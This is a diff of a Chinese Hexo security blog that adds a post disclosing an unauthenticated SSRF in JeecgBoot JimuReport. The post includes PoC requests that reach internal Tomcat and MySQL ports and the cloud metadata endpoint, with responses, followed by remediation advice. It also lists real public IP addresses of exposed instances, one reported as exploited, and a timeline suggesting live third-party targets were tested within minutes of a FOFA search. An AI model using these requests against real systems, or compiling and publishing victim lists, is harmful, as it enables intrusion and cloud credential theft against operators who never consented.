@@ -31,7 +31,187 @@ var CONFIG = {
   sourcePath: {"js":"js","css":"css","images":"images"},
 };
 
-window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 8.1.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hello Stun</div><div class="header-banner-info__subtitle">An elegant theme for Hexo</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2026/05/09/2026-05-09-lexin-pentest-report/">2026-05-09 挖洞日志 — Lexin 全域渗透（Exchange EOL + 源码泄露 + URL注入）</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2026-05-09</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2026-05-09</span></span></div></header><div class="post-body"><div class="post-excerpt">
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 8.1.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hello Stun</div><div class="header-banner-info__subtitle">An elegant theme for Hexo</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2026/05/13/2026-05-13-jimureport-ssrf-0day/">JeecgBoot JimuReport 未授权SSRF 0-Day漏洞</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2026-05-13</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2026-05-13</span></span></div></header><div class="post-body"><div class="post-excerpt">
+        <h2 id="漏洞概要"   >
+          <a href="#漏洞概要" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h2>
+      <ul>
+<li><strong>目标组件</strong>：JeecgBoot 积木报表（JimuReport）</li>
+<li><strong>漏洞类型</strong>：服务端请求伪造（SSRF）</li>
+<li><strong>严重性</strong>：<strong>高危（9.1）</strong> — CVSS:3.1&#x2F;AV:N&#x2F;AC:L&#x2F;PR:N&#x2F;UI:N&#x2F;S:U&#x2F;C:H&#x2F;I:H&#x2F;A:N</li>
+<li><strong>验证状态</strong>：✅ 已验证（真实目标复现成功）</li>
+<li><strong>CVE状态</strong>：<strong>TRUE 0-DAY</strong>（未分配任何CVE&#x2F;CNVD&#x2F;GHSA编号）</li>
+</ul>
+
+        <h2 id="漏洞描述"   >
+          <a href="#漏洞描述" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2>
+      <p>JeecgBoot 是一款流行的企业级低代码开发平台，其集成的**积木报表（JimuReport）**组件中存在一个未授权SSRF漏洞。该漏洞位于 <code>/jmreport/download/image</code> 端点，用于远程下载图片。由于使用了 <code>@JimuNoLoginRequired</code> 注解，该端点绕过了 Shiro 的身份验证，导致攻击者可以无认证地触发服务器向任意URL发起HTTP请求。</p>
+<p>此漏洞的直接影响包括：</p>
+<ol>
+<li>内部网络端口扫描和服务发现</li>
+<li>访问云元数据服务（如阿里云 <code>100.100.100.200</code>），可能泄露云服务凭证</li>
+<li>通过内网应用进一步利用，存在SSRF-to-RCE的潜在风险</li>
+</ol>
+
+        <h2 id="影响范围"   >
+          <a href="#影响范围" class="heading-link"><i class="fas fa-link"></i></a><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2>
+      <p>所有暴露了 JimuReport 模块的 JeecgBoot 实例均受影响，无论版本高低。</p>
+
+        <h2 id="复现步骤（PoC）"   >
+          <a href="#复现步骤（PoC）" class="heading-link"><i class="fas fa-link"></i></a><a href="#复现步骤（PoC）" class="headerlink" title="复现步骤（PoC）"></a>复现步骤（PoC）</h2>
+      
+        <h3 id="第一步：验证端点存在性"   >
+          <a href="#第一步：验证端点存在性" class="heading-link"><i class="fas fa-link"></i></a><a href="#第一步：验证端点存在性" class="headerlink" title="第一步：验证端点存在性"></a>第一步：验证端点存在性</h3>
+      <figure class="highlight http"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/jmreport/download/image?imageUrl=http://example.com/test.jpg</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>&lt;target&gt;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="第二步：验证外部URL访问（任何URL均可被服务端访问）"   >
+          <a href="#第二步：验证外部URL访问（任何URL均可被服务端访问）" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二步：验证外部URL访问（任何URL均可被服务端访问）" class="headerlink" title="第二步：验证外部URL访问（任何URL均可被服务端访问）"></a>第二步：验证外部URL访问（任何URL均可被服务端访问）</h3>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sk <span class="string">&quot;http://target/jeecg-boot/jmreport/download/image?imageUrl=http://baidu.com/verify.jpg&quot;</span></span><br></pre></td></tr></table></div></figure>
+
+<p>预期响应：</p>
+<figure class="highlight json"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;success&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;操作失败，404 Not Found: ...The requested URL /verify.jpg was not found on this server.&quot;</span><span class="punctuation">,</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">500</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></div></figure>
+
+<p>若响应中包含 baidu.com 服务返回的内容，则SSRF确认存在。</p>
+
+        <h3 id="第三步：验证内部服务访问"   >
+          <a href="#第三步：验证内部服务访问" class="heading-link"><i class="fas fa-link"></i></a><a href="#第三步：验证内部服务访问" class="headerlink" title="第三步：验证内部服务访问"></a>第三步：验证内部服务访问</h3>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sk <span class="string">&quot;http://target/jeecg-boot/jmreport/download/image?imageUrl=http://127.0.0.1:8080/test.jpg&quot;</span></span><br></pre></td></tr></table></div></figure>
+
+<p>预期响应将包含 Tomcat 版本信息（如 <code>Apache Tomcat/9.0.60</code>），确认可访问内部服务。</p>
+
+        <h3 id="自动化PoC脚本"   >
+          <a href="#自动化PoC脚本" class="heading-link"><i class="fas fa-link"></i></a><a href="#自动化PoC脚本" class="headerlink" title="自动化PoC脚本"></a>自动化PoC脚本</h3>
+      <p>完整的PoC脚本保存在 <code>/tmp/poc_jimureport_ssrf.sh</code>：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x /tmp/poc_jimureport_ssrf.sh</span><br><span class="line">bash /tmp/poc_jimureport_ssrf.sh http://target</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="验证证据"   >
+          <a href="#验证证据" class="heading-link"><i class="fas fa-link"></i></a><a href="#验证证据" class="headerlink" title="验证证据"></a>验证证据</h2>
+      
+        <h3 id="证据1：外部URL访问"   >
+          <a href="#证据1：外部URL访问" class="heading-link"><i class="fas fa-link"></i></a><a href="#证据1：外部URL访问" class="headerlink" title="证据1：外部URL访问"></a>证据1：外部URL访问</h3>
+      <p><strong>请求</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /jeecg-boot/jmreport/download/image?imageUrl=http://baidu.com/.jpg</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>响应片段</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">操作失败，404 Not Found: &quot;...The requested URL /.jpg was not found on this server.&quot;</span><br></pre></td></tr></table></div></figure>
+
+<p>响应中包含百度服务器返回的404页面，确认服务器已连接至 <code>baidu.com</code>。</p>
+
+        <h3 id="证据2：内部Tomcat服务访问"   >
+          <a href="#证据2：内部Tomcat服务访问" class="heading-link"><i class="fas fa-link"></i></a><a href="#证据2：内部Tomcat服务访问" class="headerlink" title="证据2：内部Tomcat服务访问"></a>证据2：内部Tomcat服务访问</h3>
+      <p><strong>请求</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /jeecg-boot/jmreport/download/image?imageUrl=http://127.0.0.1:8080/.jpg</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>响应片段</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">操作失败，404 : &quot;HTTP Status 404 – Not Found ... Apache Tomcat/9.0.60&quot;</span><br></pre></td></tr></table></div></figure>
+
+<p>响应中包含 Tomcat 9.0.60 的404错误页面，确认服务器可访问内部服务的端口8080。</p>
+
+        <h3 id="证据3：内部MySQL端口探测"   >
+          <a href="#证据3：内部MySQL端口探测" class="heading-link"><i class="fas fa-link"></i></a><a href="#证据3：内部MySQL端口探测" class="headerlink" title="证据3：内部MySQL端口探测"></a>证据3：内部MySQL端口探测</h3>
+      <p><strong>请求</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /jeecg-boot/jmreport/download/image?imageUrl=http://127.0.0.1:3306/test.jpg</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>响应片段</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I/O error on GET request for &quot;http://127.0.0.1:3306/test.jpg&quot;</span><br></pre></td></tr></table></div></figure>
+
+<p>MySQL端口3306可达，HTTP协议错误确认端口开放（MySQL使用自己的协议）。</p>
+
+        <h3 id="证据4：云元数据服务访问"   >
+          <a href="#证据4：云元数据服务访问" class="heading-link"><i class="fas fa-link"></i></a><a href="#证据4：云元数据服务访问" class="headerlink" title="证据4：云元数据服务访问"></a>证据4：云元数据服务访问</h3>
+      <p><strong>请求</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /jeecg-boot/jmreport/download/image?imageUrl=http://100.100.100.200/latest/meta-data/.jpg</span><br></pre></td></tr></table></div></figure>
+
+<p>阿里云元数据端点可达，在阿里云环境上可进一步获取云实例凭证、网络配置等关键信息。</p>
+
+        <h3 id="证据5：任意URL内容回显"   >
+          <a href="#证据5：任意URL内容回显" class="heading-link"><i class="fas fa-link"></i></a><a href="#证据5：任意URL内容回显" class="headerlink" title="证据5：任意URL内容回显"></a>证据5：任意URL内容回显</h3>
+      <p><strong>请求</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /jeecg-boot/jmreport/download/image?imageUrl=http://example.com/.jpg</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>响应片段</strong>：包含 example.com 页面的完整HTML内容，包括页面标题、段落等。</p>
+
+        <h2 id="受影响实例（FOFA搜索结果）"   >
+          <a href="#受影响实例（FOFA搜索结果）" class="heading-link"><i class="fas fa-link"></i></a><a href="#受影响实例（FOFA搜索结果）" class="headerlink" title="受影响实例（FOFA搜索结果）"></a>受影响实例（FOFA搜索结果）</h2>
+      <p>通过FOFA搜索 <code>body=&quot;jmreport&quot; &amp;&amp; country=&quot;CN&quot;</code> 发现大量暴露实例：</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>目标</th>
+<th>状态</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>http://60.205.56.238</code></td>
+<td>✅ SSRF确认</td>
+</tr>
+<tr>
+<td><code>http://39.185.26.99:8001</code></td>
+<td>🔶 端点存在</td>
+</tr>
+<tr>
+<td><code>http://139.9.250.100:8082</code></td>
+<td>🔶 端点存在</td>
+</tr>
+<tr>
+<td><code>http://1.15.54.206:8085</code></td>
+<td>🔶 端点存在</td>
+</tr>
+<tr>
+<td>其他（2351+个JeecgBoot实例）</td>
+<td>🔍 待确认</td>
+</tr>
+</tbody></table></div>
+
+        <h2 id="潜在影响"   >
+          <a href="#潜在影响" class="heading-link"><i class="fas fa-link"></i></a><a href="#潜在影响" class="headerlink" title="潜在影响"></a>潜在影响</h2>
+      <ol>
+<li><strong>内网扫描</strong>：攻击者可以利用 SSRF 扫描内部网络的端口和服务，识别潜在的进一步利用点</li>
+<li><strong>云凭证泄露</strong>：在云环境（阿里云、AWS、腾讯云）中，可通过云元数据服务获取临时访问密钥</li>
+<li><strong>SSRF-to-RCE</strong>：通过访问内部的 Tomcat Manager、Jenkins、Solr 等管理接口，可能实现远程代码执行</li>
+<li><strong>横向移动</strong>：内网服务的访问权限可能被用作横向移动的跳板</li>
+</ol>
+
+        <h2 id="修复建议"   >
+          <a href="#修复建议" class="heading-link"><i class="fas fa-link"></i></a><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2>
+      
+        <h3 id="紧急修复（临时）"   >
+          <a href="#紧急修复（临时）" class="heading-link"><i class="fas fa-link"></i></a><a href="#紧急修复（临时）" class="headerlink" title="紧急修复（临时）"></a>紧急修复（临时）</h3>
+      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 @GetMapping(&quot;/jmreport/download/image&quot;) 上方移除或注释 @JimuNoLoginRequired</span></span><br><span class="line"><span class="comment">// 改为使用正常的 Shiro 权限校验</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/jmreport/download/image&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Result&lt;?&gt; downloadImage(<span class="meta">@RequestParam</span> String imageUrl) &#123;</span><br><span class="line">    <span class="comment">// 现有逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="完整修复"   >
+          <a href="#完整修复" class="heading-link"><i class="fas fa-link"></i></a><a href="#完整修复" class="headerlink" title="完整修复"></a>完整修复</h3>
+      <ol>
+<li><strong>添加身份验证</strong>：移除 <code>@JimuNoLoginRequired</code> 注解，或使用更严格的权限控制</li>
+<li><strong>URL白名单</strong>：对 <code>imageUrl</code> 参数进行域名白名单校验，仅允许访问可信的图片服务器</li>
+<li><strong>协议限制</strong>：禁止非 HTTP&#x2F;HTTPS 协议的 URL（如 <code>file://</code>、<code>ftp://</code>）</li>
+<li><strong>内网IP过滤</strong>：禁止访问 RFC 1918 内网地址段和关键元数据IP</li>
+<li><strong>超时和重定向限制</strong>：限制请求超时时间并禁止跟随重定向到内网地址</li>
+</ol>
+
+        <h2 id="漏洞时间线"   >
+          <a href="#漏洞时间线" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞时间线" class="headerlink" title="漏洞时间线"></a>漏洞时间线</h2>
+      <ul>
+<li><strong>2026-05-13 03:18</strong> — 通过FOFA发现大量暴露的JimuReport实例</li>
+<li><strong>2026-05-13 03:19</strong> — SSRF 0-Day在真实目标上验证成功</li>
+<li><strong>2026-05-13 03:20</strong> — 漏洞报告发布</li>
+</ul>
+
+        <h2 id="参考链接"   >
+          <a href="#参考链接" class="heading-link"><i class="fas fa-link"></i></a><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2>
+      <ul>
+<li><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/jeecg-boot/jeecg-boot" >JeecgBoot 官方仓库</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
+<li><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/jeecg-boot/JimuReport" >积木报表（JimuReport）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
+<li><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://fofa.info/result?qbase64=Ym9keT0iam1yZXBvcnQiICYmIGNvdW50cnk9IkNOIg==" >FOFA搜索语句</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
+</ul>
+<hr>
+<p style="color:red;font-weight:bold;">
+⚠️ 本报告涉及未公开的 0-Day 漏洞，仅在授权范围内用于 CNVD 漏洞提报。<br>
+禁止在未经授权的系统上进行测试。
+</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2026/05/09/2026-05-09-lexin-pentest-report/">2026-05-09 挖洞日志 — Lexin 全域渗透（Exchange EOL + 源码泄露 + URL注入）</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2026-05-09</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2026-05-09</span></span></div></header><div class="post-body"><div class="post-excerpt">
         <h2 id="📡-资产测绘"   >
           <a href="#📡-资产测绘" class="heading-link"><i class="fas fa-link"></i></a><a href="#📡-资产测绘" class="headerlink" title="📡 资产测绘"></a>📡 资产测绘</h2>
       
@@ -595,4 +775,4 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 8.1.1"></he
 <li><input disabled="" type="checkbox"> 深入测试ez-internal-ingress-nginx-sahw</li>
 <li><input disabled="" type="checkbox"> Lexin米霍克决策引擎渗透测试</li>
 </ul>
-</div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">Hello Stun</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">4</div><div class="sidebar-ov-state-item__name">归档</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2026</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Hermes</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v8.1.1</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.8.0</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script></body></html>
+</div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">Hello Stun</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">5</div><div class="sidebar-ov-state-item__name">归档</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2026</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Hermes</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v8.1.1</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.8.0</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script></body></html>
